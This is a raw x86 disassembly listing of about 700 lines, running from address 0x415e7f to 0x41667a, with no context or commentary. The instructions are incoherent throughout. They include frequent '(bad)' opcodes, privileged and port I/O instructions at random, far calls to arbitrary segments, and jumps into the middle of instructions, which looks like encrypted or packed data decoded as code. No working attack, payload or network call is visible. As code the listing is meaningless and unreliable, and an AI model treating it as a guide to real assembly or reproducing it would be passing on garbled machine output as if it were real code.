  415e7f:	xor    cl,BYTE PTR [esp+ecx*4-0x9bca832]
  415e86:	mov    edi,0xe79757bd
  415e8b:	pop    esi
  415e8c:	lock (bad) 
  415e8e:	aam    0xa4
  415e90:	mov    cl,0x80
  415e92:	mov    dh,0xcb
  415e94:	(bad)  
  415e95:	pop    ebp
  415e96:	adc    ecx,ebp
  415e98:	mov    edx,0xa49624a0
  415e9d:	inc    edx
  415e9e:	rol    BYTE PTR [esi+eiz*2+0x1389d1c8],cl
  415ea5:	loope  0x415e97
  415ea7:	(bad)  
  415eaa:	dec    esp
  415eab:	dec    edx
  415eac:	add    bh,BYTE PTR [edi]
  415eae:	mov    DWORD PTR [eax-0xd],ecx
  415eb1:	into   
  415eb2:	or     al,0xa3
  415eb4:	(bad)  
  415eb7:	push   ebx
  415eb8:	mov    eax,0x1c3ebbca
  415ebd:	add    dl,bl
  415ebf:	or     al,0x50
  415ec1:	xchg   ebx,eax
  415ec2:	ret    0x52ae
  415ec5:	daa    
  415ec6:	scas   eax,DWORD PTR es:[edi]
  415ec7:	mov    ch,0x5b
  415ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415eca:	clc    
  415ecb:	xchg   BYTE PTR [esi-0xb8ba9b8],ch
  415ed1:	lods   eax,DWORD PTR ds:[esi]
  415ed2:	fistp  QWORD PTR [edi+ecx*4+0x4173fadb]
  415ed9:	push   0x326c0c9f
  415ede:	mov    al,0xf0
  415ee0:	push   ebp
  415ee1:	push   0xf7ec8c57
  415ee6:	ja     0x415f59
  415ee8:	cwde   
  415ee9:	cli    
  415eea:	loope  0x415ebf
  415eec:	or     ebp,esp
  415eee:	jl     0x415ea7
  415ef0:	(bad)  
  415ef1:	aas    
  415ef2:	mov    edi,0x15e7053b
  415ef7:	cmp    ecx,edx
  415ef9:	push   ecx
  415efa:	xor    al,0x5d
  415efc:	mov    ebx,0xe4bb8955
  415f01:	fcomp  DWORD PTR [ebp-0x5a]
  415f04:	jnp    0x415ebb
  415f06:	jle    0x415e8f
  415f08:	test   eax,0x4c70b067
  415f0d:	ds xor esp,edi
  415f10:	sub    BYTE PTR [eax+0x1fd0e0a7],ch
  415f16:	test   DWORD PTR [edx-0x5f5e3b78],ebp
  415f1c:	sbb    al,0x1c
  415f1e:	hlt    
  415f1f:	int3   
  415f20:	mov    eax,0x32214f3d
  415f25:	add    eax,DWORD PTR [edi-0x5]
  415f28:	int    0x4c
  415f2a:	not    DWORD PTR [edi-0x4e18df15]
  415f30:	jg     0x415f8e
  415f32:	popa   
  415f33:	pcmpeqb mm4,QWORD PTR [esi-0x56]
  415f37:	sti    
  415f38:	aam    0xaf
  415f3a:	xor    dl,ch
  415f3c:	ja     0x415ee9
  415f3e:	cmc    
  415f3f:	xor    edi,DWORD PTR [edi]
  415f41:	mov    dh,0x6
  415f43:	imul   edx,DWORD PTR [ebp+edx*1-0x5],0xd570117e
  415f4b:	cmp    eax,0x3b25dc09
  415f50:	hlt    
  415f51:	or     edx,esi
  415f53:	loope  0x415f9f
  415f55:	mov    ah,al
  415f57:	cwde   
  415f58:	pop    ds
  415f59:	fmul   QWORD PTR [esp+ebx*1+0x1ca374ab]
  415f60:	jb     0x415f71
  415f62:	jno    0x415f1b
  415f64:	mov    esi,DWORD PTR [edi-0x65]
  415f67:	adc    eax,0xf9afba52
  415f6c:	imul   esp,DWORD PTR [ebx],0xd7af2c8e
  415f72:	aad    0xb7
  415f74:	or     DWORD PTR [ebx-0x5],esp
  415f77:	push   ebp
  415f78:	lahf   
  415f79:	in     al,dx
  415f7a:	int3   
  415f7b:	adc    al,al
  415f7d:	push   edi
  415f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7f:	enter  0x7ee0,0x77
  415f83:	clc    
  415f84:	call   0x273d:0xb6679dca
  415f8b:	imul   edi,eax,0xffffffee
  415f8e:	shl    BYTE PTR [edx-0x58],1
  415f91:	jmp    0x415fc7
  415f93:	popa   
  415f94:	retf   0xa317
  415f97:	shr    BYTE PTR [ebp+0x30],cl
  415f9a:	and    al,0x49
  415f9c:	cmp    DWORD PTR [ebp+0x60],esp
  415f9f:	sub    edi,0x37d6d27b
  415fa5:	jl     0x415ffe
  415fa7:	ss jns 0x415fcd
  415faa:	xchg   ebp,eax
  415fab:	das    
  415fac:	pop    eax
  415fad:	add    bl,BYTE PTR [ebx]
  415faf:	ds mov dh,0x2d
  415fb2:	pop    edx
  415fb3:	(bad)
  415fb6:	mov    ebp,0x3945c49d
  415fbb:	xchg   DWORD PTR [ebx-0x36],ebp
  415fbe:	pop    ss
  415fbf:	pop    ebp
  415fc0:	leave  
  415fc1:	lahf   
  415fc2:	daa    
  415fc3:	shr    BYTE PTR [edi],1
  415fc5:	test   al,0x36
  415fc7:	mov    esp,0x56f05baa
  415fcc:	mov    ebx,0xc79ca535
  415fd1:	in     al,dx
  415fd2:	push   edi
  415fd3:	inc    eax
  415fd4:	mov    esp,0x1f194a04
  415fd9:	adc    BYTE PTR [edx+0x12],cl
  415fdc:	and    eax,0x302a6769
  415fe1:	test   eax,0x3c74813f
  415fe6:	push   ecx
  415fe7:	jge    0x416053
  415fe9:	cmp    ebx,DWORD PTR [eax+0x64]
  415fec:	dec    edi
  415fed:	icebp  
  415fee:	int3   
  415fef:	push   ds
  415ff0:	cmp    eax,0xd1fd3223
  415ff5:	sub    BYTE PTR [ecx-0x38ae4f84],ch
  415ffb:	or     eax,0x103c6e07
  416000:	or     ebx,DWORD PTR [esi-0x2bdb68e7]
  416006:	int    0x37
  416008:	scas   al,BYTE PTR es:[edi]
  416009:	mov    bh,0x31
  41600b:	fistp  WORD PTR [ecx+0x901e735]
  416011:	pusha  
  416012:	aas    
  416013:	std    
  416014:	fcomp  DWORD PTR ds:0x32992361
  41601a:	sub    eax,0xe5e71a66
  41601f:	rcr    BYTE PTR [ebx-0x6dbddd8d],1
  416025:	fisub  DWORD PTR [ecx+0x3ef08bdf]
  41602b:	ins    DWORD PTR es:[edi],dx
  41602c:	test   DWORD PTR [ebp-0x6316c81b],ebp
  416032:	inc    ebp
  416033:	push   cs
  416034:	and    dl,BYTE PTR [ebp-0x4e6c71f2]
  41603a:	sub    eax,0x8901ddc3
  41603f:	sbb    bh,BYTE PTR [ebx]
  416041:	add    edi,ebx
  416043:	and    al,0xea
  416045:	add    al,0x31
  416047:	pop    ebx
  416048:	jmp    FWORD PTR [edx-0x5f]
  41604b:	in     eax,dx
  41604c:	xchg   ebx,edx
  41604e:	add    esi,DWORD PTR [edi+0x9]
  416051:	push   es
  416052:	or     BYTE PTR [edx+edx*1-0x76e949aa],0x37
  41605a:	mov    esi,0xa47e60a7
  41605f:	stc    
  416060:	(bad)  
  416061:	(bad)  
  416062:	dec    edi
  416063:	cld    
  416064:	int    0xe8
  416066:	push   cs
  416067:	jns    0x416005
  416069:	shr    BYTE PTR [esp+edi*1-0x2d6bdae4],cl
  416070:	(bad)  
  416071:	push   esp
  416072:	pop    ebx
  416073:	jmp    0x415ffe
  416075:	mov    eax,0x85fa4042
  41607a:	add    BYTE PTR [ecx-0xa1110a4],bh
  416080:	pop    ebp
  416081:	fbld   TBYTE PTR ds:0x7652d275
  416087:	mov    DWORD PTR [edi-0x73],eax
  41608a:	ins    DWORD PTR es:[edi],dx
  41608b:	ds aas 
  41608d:	xor    eax,0x34317b3
  416092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416093:	or     BYTE PTR [ecx+0xd12ff80],cl
  416099:	sar    DWORD PTR [ebx-0x23],1
  41609c:	adc    BYTE PTR [edi+0x54],al
  41609f:	retf   
  4160a0:	pop    esi
  4160a1:	xchg   DWORD PTR [ebx+0x463a4882],eax
  4160a7:	push   0xffffff8b
  4160a9:	mov    esp,DWORD PTR [esi+0x37]
  4160ac:	into   
  4160ad:	add    al,0x77
  4160af:	xchg   edi,eax
  4160b1:	mov    cs,WORD PTR [esi-0x59]
  4160b4:	cmp    DWORD PTR [ebx-0x78],ecx
  4160b7:	sub    al,0xb2
  4160b9:	add    BYTE PTR [ebx],dh
  4160bb:	fwait
  4160bc:	mov    ch,0xf6
  4160be:	ret    0x8df4
  4160c1:	push   ds
  4160c2:	add    esi,esi
  4160c4:	outs   dx,BYTE PTR ds:[esi]
  4160c5:	es xor eax,0xd2bfa778
  4160cb:	call   DWORD PTR [esi-0x76bae54e]
  4160d1:	cdq    
  4160d2:	xadd   DWORD PTR [edx-0x545d53a],ebx
  4160d9:	cmp    edx,DWORD PTR [eax+0x36]
  4160dc:	mov    dl,0x7d
  4160de:	ret    0x9101
  4160e1:	retf   0x1870
  4160e4:	and    esi,ebx
  4160e6:	cs mov ecx,0x8a2b26c
  4160ec:	xchg   DWORD PTR ds:0x1a60d0b1,edi
  4160f2:	inc    edi
  4160f3:	ins    BYTE PTR es:[edi],dx
  4160f4:	ret    
  4160f5:	sbb    al,0x8c
  4160f7:	mov    ?,WORD PTR [esi]
  4160f9:	pop    esp
  4160fa:	add    BYTE PTR [esi-0x75],0xfd
  4160fe:	mov    BYTE PTR [ebx],bl
  416100:	adc    DWORD PTR [ebx-0x69f26ad],ecx
  416106:	mov    bh,0x88
  416108:	sbb    DWORD PTR [ebx-0x79],eax
  41610b:	nop
  41610c:	out    dx,al
  41610d:	sub    al,0xd9
  41610f:	sub    al,0x3
  416111:	adc    edi,DWORD PTR [edx+0xb]
  416114:	mov    DWORD PTR [esi+0x4b5f0f2f],esi
  41611a:	inc    edi
  41611b:	jecxz  0x41612a
  41611d:	jae    0x416148
  41611f:	jge    0x416162
  416121:	cmp    dl,BYTE PTR [edx+0x50d01e3]
  416127:	dec    ebp
  416128:	sub    DWORD PTR [ecx-0x2dfc6ad1],0xffffffae
  41612f:	fdiv   DWORD PTR [esi+0x471a6034]
  416135:	cmp    bl,BYTE PTR [ecx]
  416137:	or     dh,BYTE PTR [ebp-0x5a]
  41613a:	xchg   BYTE PTR [esi],dh
  41613c:	(bad)  
  41613d:	rol    dh,cl
  41613f:	lea    ebp,[edi-0x6101459f]
  416145:	sbb    eax,0x1bce1092
  41614a:	cmp    edx,DWORD PTR [edx+0x4]
  41614d:	(bad)  [ecx-0x5151aa2d]
  416153:	int    0x89
  416155:	cwde   
  416156:	xchg   ebx,eax
  416158:	aad    0xdc
  41615a:	lods   eax,DWORD PTR cs:[esi]
  41615c:	arpl   WORD PTR [edi-0x3d],ax
  41615f:	mov    edi,0xc9c83a77
  416164:	mov    edx,0xc1be91de
  416169:	xchg   esp,eax
  41616a:	xchg   ecx,eax
  41616b:	sti    
  41616c:	or     al,0x66
  41616e:	dec    edi
  41616f:	imul   eax,ecx,0x4e
  416172:	clc    
  416173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416174:	aam    0x8e
  416176:	fsub   QWORD PTR [eax]
  416178:	ins    DWORD PTR es:[edi],dx
  416179:	cmp    cl,BYTE PTR [eax-0x17]
  41617c:	sar    ch,0x49
  41617f:	dec    esi
  416180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416182:	xchg   DWORD PTR [edi-0x6a],eax
  416185:	push   es
  416186:	stc    
  416187:	sar    ebx,cl
  416189:	dec    esi
  41618a:	mov    esi,0xcedc42cf
  41618f:	mov    ebx,0xa3f80523
  416194:	mov    cl,0xc1
  416196:	shl    BYTE PTR [esi],1
  416198:	fcomp  QWORD PTR [esi+0x25797a95]
  41619e:	cmp    eax,0x895a0213
  4161a3:	add    DWORD PTR [eax-0x7e],esi
  4161a6:	and    al,BYTE PTR [ebp-0x39]
  4161a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161aa:	mov    BYTE PTR [esi-0x6b63f2a2],bh
  4161b0:	imul   ebx,DWORD PTR [eax+0x31],0x1a
  4161b4:	sbb    edi,ebp
  4161b6:	mov    edi,0xfa67214c
  4161bb:	sub    cl,BYTE PTR [ecx]
  4161bd:	nop
  4161be:	pop    ebx
  4161bf:	stos   DWORD PTR es:[edi],eax
  4161c0:	cmp    edx,DWORD PTR [eax-0x513d9cae]
  4161c6:	loopne 0x41622a
  4161c8:	jmp    0x4161e1
  4161ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161cb:	imul   esi,DWORD PTR [ecx+0x54],0x52afe19a
  4161d2:	cmp    dl,ah
  4161d4:	cmp    BYTE PTR ds:0x706d93d7,bl
  4161da:	pop    esi
  4161db:	dec    esi
  4161dc:	push   esp
  4161dd:	ja     0x4161fc
  4161df:	inc    ecx
  4161e0:	enter  0x9f1b,0x10
  4161e4:	cmp    eax,0x2a6d47dc
  4161e9:	icebp  
  4161ea:	sub    edi,esi
  4161ec:	ret    0xaa9d
  4161ef:	ins    BYTE PTR es:[edi],dx
  4161f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161f1:	es jnp 0x416176
  4161f4:	mov    esi,cr3
  4161f7:	outs   dx,DWORD PTR ds:[esi]
  4161f8:	sub    eax,0x6a5a4da1
  4161fd:	sbb    BYTE PTR [edx+0x2f],dl
  416200:	adc    eax,0x328c280c
  416205:	je     0x416266
  416207:	adc    al,0x32
  416209:	add    DWORD PTR [edi-0x2e],esi
  41620c:	jae    0x416268
  41620e:	fdiv   QWORD PTR [ebx+0x589f591]
  416214:	call   0xe5d7:0xb5cee050
  41621b:	mov    ch,0x46
  41621d:	ror    esp,0x78
  416220:	cmp    eax,0x71c1cb92
  416225:	mov    eax,ds:0x5ad86cf3
  41622a:	stc    
  41622b:	dec    ebx
  41622c:	xchg   ebx,eax
  41622d:	mov    ebx,0x3e80252c
  416232:	adc    eax,0x5c779de
  416237:	inc    eax
  416238:	xchg   edx,eax
  416239:	pop    esp
  41623a:	sub    esp,DWORD PTR ds:0x19af5d58
  416240:	fcom   DWORD PTR [ebp-0x7e]
  416243:	sahf   
  416244:	push   es
  416245:	leave  
  416246:	lea    ebp,[eax+ebp*4]
  416249:	aad    0xac
  41624b:	push   ebp
  41624c:	fadd   DWORD PTR [edx]
  41624e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41624f:	(bad)  
  416250:	mov    edi,0x13ec6e18
  416255:	and    al,cl
  416257:	test   BYTE PTR [ecx],dh
  416259:	mov    cs,ebx
  41625b:	push   ecx
  41625c:	sahf   
  41625d:	sbb    BYTE PTR [edi+edx*2],0xba
  416261:	fcom   DWORD PTR [esi-0x23bb8d9]
  416267:	test   DWORD PTR [ebx+0x63],edx
  41626a:	repz iret 
  41626c:	dec    edx
  41626d:	inc    esp
  41626e:	sbb    al,BYTE PTR [ebp-0x7c67bb4e]
  416274:	cmp    dh,BYTE PTR [ebp+0x7b430ed9]
  41627a:	(bad)  [ebx-0x1b0a9b9d]
  416280:	pop    eax
  416281:	pop    edx
  416282:	into   
  416283:	out    0x9a,eax
  416285:	xchg   edi,eax
  416286:	push   edx
  416287:	push   edi
  416288:	(bad)  
  416289:	in     eax,dx
  41628a:	jbe    0x41622e
  41628c:	test   al,0x5e
  41628e:	int    0x27
  416290:	shl    DWORD PTR [esi],1
  416292:	xchg   ecx,eax
  416293:	cmp    al,0x84
  416295:	pop    edi
  416296:	xchg   ecx,eax
  416297:	sar    bl,1
  416299:	sub    BYTE PTR [edi+esi*1+0x55ec337e],cl
  4162a0:	fist   WORD PTR [ecx]
  4162a2:	xchg   ebx,eax
  4162a3:	mov    edx,0xbc680da0
  4162a8:	pop    ecx
  4162a9:	sub    eax,0xc2cddc4b
  4162ae:	dec    ebx
  4162af:	dec    ebx
  4162b0:	stos   BYTE PTR es:[edi],al
  4162b1:	xor    al,0x1e
  4162b3:	popa   
  4162b4:	push   esp
  4162b5:	fwait
  4162b6:	or     edi,0xffffff9a
  4162b9:	sar    cl,cl
  4162bb:	jb     0x41631e
  4162bd:	cwde   
  4162be:	jle    0x41627c
  4162c0:	int    0xd3
  4162c2:	inc    esi
  4162c3:	cmp    DWORD PTR [ebp+0x9],ebp
  4162c6:	in     eax,0x32
  4162c8:	ret    
  4162c9:	repz stc 
  4162cb:	sbb    al,0x8c
  4162cd:	add    esp,DWORD PTR [eax+0xc]
  4162d0:	pop    ebx
  4162d1:	mov    esp,0x18930a09
  4162d6:	push   0xb45ae62c
  4162db:	push   0x59bc5fe1
  4162e0:	mov    dl,0x50
  4162e2:	dec    ecx
  4162e3:	mov    gs,WORD PTR [ebx]
  4162e5:	enter  0xc77d,0x6e
  4162e9:	sbb    bh,BYTE PTR [ebx-0x219d1a7b]
  4162ef:	je     0x416344
  4162f1:	out    0xf4,eax
  4162f3:	xchg   edi,eax
  4162f4:	pop    esi
  4162f5:	sbb    DWORD PTR [edi-0x1],eax
  4162f8:	cmp    BYTE PTR [ecx+0x11c54ca4],0x1d
  4162ff:	mov    eax,eax
  416301:	sbb    BYTE PTR [eax+0x60],0xa7
  416305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416306:	mov    ecx,0xd1eaff7c
  41630b:	inc    ebx
  41630c:	push   ds
  41630d:	pop    es
  41630e:	xchg   edx,eax
  41630f:	add    eax,0x7747eac9
  416314:	xor    BYTE PTR [ebp+edi*2+0x4cb26769],ch
  41631b:	add    BYTE PTR [eax],cl
  41631d:	(bad)
  416321:	(bad)  
  416322:	aam    0xe6
  416324:	cs fs ja 0x4162ad
  416328:	iret   
  416329:	out    0x88,eax
  41632b:	mov    eax,ds:0x75e3f98c
  416330:	pop    ebx
  416331:	retf   
  416332:	push   edi
  416333:	jl     0x416310
  416335:	push   0x6ec7bc8f
  41633a:	les    ebx,FWORD PTR [ebx+0x2c]
  41633d:	in     eax,0x7a
  41633f:	out    0x6f,eax
  416341:	pop    ecx
  416342:	xlat   BYTE PTR ds:[ebx]
  416343:	lea    ecx,[ebx+0x6d]
  416346:	imul   esi,DWORD PTR [edi],0xffffffa1
  416349:	popa   
  41634a:	mov    ch,dl
  41634c:	and    al,0xde
  41634e:	in     al,0x71
  416350:	xchg   DWORD PTR [ebx],edi
  416352:	push   ecx
  416353:	(bad)  [edx+0x47]
  416356:	lds    esp,FWORD PTR [edx+0x393201a9]
  41635c:	mov    ecx,0x5b41c352
  416361:	fld    QWORD PTR [ecx-0x77]
  416364:	int    0x6a
  416366:	mov    cl,0x3c
  416368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416369:	addr16 js 0x416353
  41636c:	jmp    0x416356
  41636e:	xchg   edx,eax
  41636f:	loopne 0x4162f9
  416371:	in     eax,0xec
  416373:	out    0x87,eax
  416375:	lea    esp,[esi-0x49]
  416378:	dec    edi
  416379:	xchg   ebx,eax
  41637a:	pop    esp
  41637b:	mov    ch,0xd0
  41637d:	test   al,0xd1
  41637f:	adc    al,0xb4
  416381:	sub    DWORD PTR [eax-0xe46eeb],ecx
  416387:	scas   al,BYTE PTR es:[edi]
  416388:	stos   DWORD PTR es:[edi],eax
  416389:	mov    ebp,0xdc552fd4
  41638e:	xchg   ecx,eax
  41638f:	pop    ebp
  416390:	addr16 pop esp
  416392:	lods   al,BYTE PTR es:[esi]
  416394:	repz test BYTE PTR [ecx-0x31],ah
  416398:	jge    0x4163e1
  41639a:	ja     0x4163d8
  41639c:	jmp    0x1386:0x3d41e012
  4163a3:	lods   al,BYTE PTR ds:[esi]
  4163a4:	pop    ds
  4163a5:	and    bh,ch
  4163a7:	jo     0x4163bc
  4163a9:	dec    esi
  4163aa:	xchg   esp,eax
  4163ab:	add    DWORD PTR [edx+eiz*4-0x76],esi
  4163af:	push   ss
  4163b0:	pop    eax
  4163b1:	test   eax,0x17be413d
  4163b6:	dec    esp
  4163b7:	shl    ah,1
  4163b9:	in     al,0xa2
  4163bb:	dec    DWORD PTR [esi-0x2c326afe]
  4163c1:	test   al,0x46
  4163c3:	call   0x93cb:0x48e4fda7
  4163ca:	adc    bh,al
  4163cc:	cmp    BYTE PTR [ebx+0x5f],0x37
  4163d0:	and    edx,DWORD PTR [esi-0x1d]
  4163d3:	and    ch,BYTE PTR [ebx]
  4163d5:	inc    esp
  4163d6:	inc    edi
  4163d7:	shl    DWORD PTR [esi],0xbe
  4163da:	inc    edi
  4163db:	or     edi,DWORD PTR [ecx-0x13]
  4163de:	and    BYTE PTR [esi+edx*2-0x47491bc0],cl
  4163e5:	push   esi
  4163e6:	add    eax,0x4eeaad61
  4163eb:	jbe    0x416418
  4163ed:	adc    eax,0x3d
  4163f0:	dec    esp
  4163f1:	loopne 0x4163dc
  4163f3:	stos   BYTE PTR es:[edi],al
  4163f4:	sbb    DWORD PTR [esi],ebp
  4163f6:	dec    edx
  4163f7:	push   0x62aa2bf6
  4163fc:	gs out dx,eax
  4163fe:	outs   dx,BYTE PTR ds:[esi]
  4163ff:	stc    
  416400:	or     al,BYTE PTR [edi-0x7cbb3cf9]
  416406:	dec    ebp
  416407:	imul   ebx,eax,0x71
  41640a:	stos   BYTE PTR es:[edi],al
  41640b:	pop    esi
  41640c:	cmp    edi,0x4d011681
  416412:	mov    eax,0x254bf53a
  416417:	ja     0x416442
  416419:	(bad)  
  41641a:	rol    BYTE PTR [eax],cl
  41641c:	call   0x1cc5:0x3f47de51
  416423:	or     al,0x60
  416425:	(bad)  
  416426:	scas   eax,DWORD PTR es:[edi]
  416427:	mov    ah,0xc0
  416429:	mov    ?,WORD PTR [edi-0x4b01b4eb]
  41642f:	xor    BYTE PTR [edx-0x47af0214],dh
  416435:	push   ebx
  416436:	fwait
  416437:	mov    DWORD PTR [ebp-0x70],ebx
  41643a:	bound  ecx,QWORD PTR [ecx+0x6fa67169]
  416440:	fnstenvw [esi-0x4095acbd]
  416447:	cmp    al,0x14
  416449:	jae    0x4163fb
  41644b:	ds out 0xe7,eax
  41644e:	xor    eax,0x5ab0ea5e
  416453:	or     esi,DWORD PTR [eax-0x4cf6c836]
  416459:	in     al,0xc4
  41645b:	add    esp,DWORD PTR [edx-0x54]
  41645e:	enter  0xb2ef,0x5f
  416462:	(bad)  
  416463:	(bad)
  416466:	mov    cl,BYTE PTR [edi-0x2ec735e]
  41646c:	adc    ecx,ebp
  41646e:	daa    
  41646f:	aam    0x5d
  416471:	mov    eax,DWORD PTR [ecx+0x6522a560]
  416477:	les    esi,FWORD PTR [ebp+0x18]
  41647a:	in     eax,0x3
  41647c:	ss cmp edx,DWORD PTR ss:[ebx]
  416480:	imul   edi,DWORD PTR [edx-0x7b],0x3fe19329
  416487:	and    dl,0x1c
  41648a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41648b:	push   cs
  41648c:	icebp  
  41648d:	mov    WORD PTR [ebx+0x6b],gs
  416490:	stos   BYTE PTR es:[edi],al
  416491:	fcmovnb st,st(7)
  416493:	sbb    DWORD PTR [esi+0x6444c8eb],ebx
  416499:	js     0x4164f2
  41649b:	adc    esi,edx
  41649d:	mov    cl,0x3
  41649f:	mov    WORD PTR ds:0x7d81b602,ds
  4164a5:	push   esi
  4164a6:	out    0xeb,eax
  4164a8:	icebp  
  4164a9:	xchg   WORD PTR ds:0x9217a3c9,cx
  4164b0:	add    al,0xee
  4164b2:	mov    dh,0x62
  4164b4:	mov    ds:0x53e78e93,eax
  4164b9:	add    ebx,esi
  4164bb:	cmp    eax,0xd9a9a227
  4164c0:	inc    ebp
  4164c1:	pop    esi
  4164c2:	xchg   edi,eax
  4164c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c4:	dec    edx
  4164c5:	scas   al,BYTE PTR es:[edi]
  4164c6:	and    bh,BYTE PTR [ebp-0xb]
  4164c9:	mov    ebx,0x3261c402
  4164ce:	pop    ds
  4164cf:	int3   
  4164d0:	scas   eax,DWORD PTR es:[edi]
  4164d1:	dec    eax
  4164d2:	sub    ch,al
  4164d4:	mov    ds:0x731abf82,eax
  4164d9:	sbb    bh,dh
  4164db:	sub    eax,0xa75b252d
  4164e0:	rcl    DWORD PTR cs:[ebx],0xc6
  4164e4:	outs   dx,DWORD PTR ss:[esi]
  4164e6:	rcr    dl,1
  4164e8:	fisubr WORD PTR [esi+0x60]
  4164eb:	les    ebx,FWORD PTR [ecx+0x3171d7c]
  4164f1:	push   esp
  4164f2:	jecxz  0x41648e
  4164f4:	fisttp QWORD PTR [ebx+0xc]
  4164f7:	push   ss
  4164f8:	retf   0xbdcc
  4164fb:	push   ecx
  4164fc:	or     edx,DWORD PTR [ebx]
  4164fe:	scas   al,BYTE PTR es:[edi]
  4164ff:	inc    edi
  416500:	or     ah,ch
  416502:	mov    bh,0x67
  416504:	in     al,0xab
  416506:	nop
  416507:	(bad)  
  416509:	imul   eax,DWORD PTR [esi-0x4c],0x9bf2fdb3
  416510:	cmp    eax,0x5b60b7bb
  416515:	imul   ecx,DWORD PTR [eax-0x6883212],0x1e
  41651c:	mov    eax,ds:0xe942fe2e
  416521:	das    
  416522:	loope  0x416563
  416524:	imul   ecx,DWORD PTR es:[ecx],0xffa07a7c
  41652b:	test   al,0xf3
  41652d:	repz in al,0xb1
  416530:	enter  0x2a0e,0xc3
  416534:	cld    
  416535:	mov    ecx,0x425d1806
  41653a:	and    edi,DWORD PTR [ecx-0x4c047d36]
  416540:	jmp    0x4165ad
  416542:	jne    0x416520
  416544:	imul   edi
  416546:	mov    eax,0xcd131fc2
  41654b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41654c:	jno    0x416567
  41654e:	jle    0x416571
  416550:	xchg   esp,eax
  416551:	out    dx,al
  416552:	xchg   esi,eax
  416553:	inc    edi
  416554:	xlat   BYTE PTR ds:[ebx]
  416555:	rcr    ch,0x92
  416558:	iret   
  416559:	xchg   edx,eax
  41655a:	jl     0x4164eb
  41655c:	and    al,0xaf
  41655e:	adc    DWORD PTR [esi+0x5452ce21],edi
  416564:	xchg   edi,eax
  416565:	outs   dx,BYTE PTR ds:[esi]
  416566:	dec    eax
  416567:	xchg   edi,eax
  416568:	scas   eax,DWORD PTR es:[edi]
  416569:	sub    al,0x3c
  41656b:	push   eax
  41656c:	in     al,dx
  41656d:	mov    ecx,?
  41656f:	xchg   ecx,eax
  416570:	push   es
  416571:	mov    BYTE PTR [edx-0x19],dh
  416574:	mov    edi,0xaa0e5ff0
  416579:	nop
  41657a:	xor    ah,BYTE PTR [edx-0x662e69ee]
  416580:	idiv   DWORD PTR [edx-0x78]
  416583:	or     BYTE PTR [ecx+0x67],bh
  416586:	rcr    bl,cl
  416588:	int3   
  416589:	push   edi
  41658a:	xor    DWORD PTR [esi-0x3ea92a04],eax
  416590:	xor    DWORD PTR [esi-0x45],ebp
  416593:	mov    ds:0xf7b469d5,eax
  416598:	icebp  
  416599:	faddp  st(7),st
  41659b:	mov    DWORD PTR [ecx],edx
  41659d:	adc    esi,DWORD PTR [ebx-0x79c1bacf]
  4165a3:	fsubr  DWORD PTR [edi+eiz*4-0x79]
  4165a7:	ror    DWORD PTR [edx-0x40],1
  4165aa:	pop    ds
  4165ab:	jmp    0xea768303
  4165b0:	mov    bl,0xff
  4165b2:	cmp    dl,BYTE PTR [ebp-0xd8e0db3]
  4165b8:	inc    esi
  4165b9:	jmp    0x874f:0x650e30c8
  4165c0:	or     ax,0x92fe
  4165c4:	popa   
  4165c5:	stos   DWORD PTR es:[edi],eax
  4165c6:	xchg   edi,eax
  4165c7:	mov    ebp,0xa8c70776
  4165cc:	and    eax,0x8e29ae24
  4165d1:	mov    dl,0xaf
  4165d3:	int    0xb5
  4165d5:	cmp    al,0xd0
  4165d7:	sub    eax,0xaed97e91
  4165dc:	xchg   bp,ax
  4165de:	(bad)  
  4165df:	cmp    al,0xd9
  4165e1:	imul   ebx,DWORD PTR [edx+0x51],0xffffff87
  4165e5:	ret    0x5043
  4165e8:	xchg   edi,eax
  4165e9:	out    0xe6,eax
  4165eb:	pop    esp
  4165ec:	nop
  4165ed:	sbb    al,0x1a
  4165ef:	jmp    0xf4151c8a
  4165f4:	sub    dh,dh
  4165f6:	lea    esp,[ebx-0x39]
  4165f9:	cwd    
  4165fb:	jle    0x4165f6
  4165fd:	add    edi,edx
  4165ff:	add    al,0x98
  416601:	(bad)  
  416602:	ds (bad) 
  416605:	test   eax,0xaf38458f
  41660a:	dec    ebx
  41660b:	xlat   BYTE PTR ds:[ebx]
  41660c:	gs cmp eax,0xfddbf2d5
  416612:	into   
  416613:	jecxz  0x416674
  416615:	cmp    DWORD PTR [ebx],esp
  416617:	inc    esp
  416618:	iret   
  416619:	mov    cl,0xa4
  41661b:	lds    edx,FWORD PTR [edx+0x9]
  41661e:	push   cs
  41661f:	sbb    ah,BYTE PTR [ebp-0x34]
  416622:	ficom  DWORD PTR [edx]
  416624:	add    dl,BYTE PTR [ecx]
  416626:	adc    dl,dl
  416628:	enterw 0x4c9f,0x72
  41662d:	les    ebx,FWORD PTR [ebp+0x7dd6289f]
  416633:	jmp    0x106e2052
  416638:	push   esp
  416639:	iret   
  41663a:	adc    eax,0x9068fe3c
  41663f:	push   0xffffffc2
  416641:	pop    ebx
  416642:	jle    0x4166b6
  416644:	je     0x4166a6
  416646:	sbb    eax,0x8859d73f
  41664b:	bound  edx,QWORD PTR [esi]
  41664d:	pop    eax
  41664e:	add    BYTE PTR [esi-0x79c69fbc],bh
  416654:	add    al,ah
  416656:	inc    esi
  416657:	mul    BYTE PTR [edi-0x26]
  41665a:	mov    WORD PTR [ecx],gs
  41665c:	adc    dh,BYTE PTR [ebx]
  41665e:	push   ecx
  41665f:	jbe    0x4166b7
  416661:	push   0xcb9ac23f
  416666:	shr    esi,0x1c
  416669:	rcr    eax,0x21
  41666c:	arpl   WORD PTR [ebx-0x21],cx
  41666f:	ss cwde 
  416671:	adc    eax,esi
  416673:	arpl   WORD PTR [ecx+0x79ea7c66],bp
  416679:	pop    ebx
  41667a:	dec    ecx
